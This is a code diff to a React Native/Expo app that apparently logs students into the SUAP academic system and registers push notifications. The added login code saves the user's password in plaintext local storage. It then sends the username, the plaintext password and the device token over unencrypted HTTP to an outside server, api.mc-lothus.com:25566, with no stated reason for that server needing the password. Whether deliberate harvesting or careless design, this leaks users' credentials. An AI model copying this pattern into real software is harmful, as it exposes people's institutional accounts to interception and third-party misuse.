@@ -20,6 +20,13 @@ import * as Device from 'expo-device'
 
 const Stack = createStackNavigator()
 
+import SUAP from './src/services/SUAP'
+
+import axios from 'axios'
+
+import * as Keychain from 'react-native-keychain'
+
+
 Notifications.setNotificationHandler({
   handleNotification: async () => ({
     shouldShowAlert: true,
@@ -34,11 +41,44 @@ export default function App() {
 
   const [exists, setExists] = useState(undefined);
 
+  const tryLogin = (user, password) => {
+
+    SUAP.Login(user, password).then(async data => {
+      if (!data) {
+        setUser({ value: user, error: "Usuário ou senha inválidos" })
+        setPassword({ value: password, error: "Usuário ou senha inválidos" })
+      } else {
+
+        Keychain.setGenericPassword(user, password);
+
+        AsyncStorage.setItem("userinfo", JSON.stringify({
+          user: user,
+          password: password,
+          token: data.access,
+        }));
+
+        setExists(true)
+
+        Notifications.getDevicePushTokenAsync().then(tokenn => {
+
+          AsyncStorage.setItem("token", tokenn.data)
+
+          axios.post("http://api.mc-lothus.com:25566/postToken", {
+            user: user,
+            password: password,
+            token: tokenn.data,
+          })
+        })
+      }
+    })
+  }
+
   useEffect(() => {
 
     AsyncStorage.getItem("token").then(token => {
       console.log(token)
       if (!token) {
+        console.log("GETTING TOKEN")
         messaging().getToken().then(tokenn => {
           console.log(tokenn)
           AsyncStorage.setItem("token", tokenn)
@@ -47,7 +87,13 @@ export default function App() {
     })
 
     AsyncStorage.getItem("userinfo").then(res => {
-      setExists(res);
+      if(!res) {
+        setExists(false)
+        return;
+      }
+      const parse = JSON.parse(res);
+
+      tryLogin(parse.user, parse.password);
     })
 
     messaging()
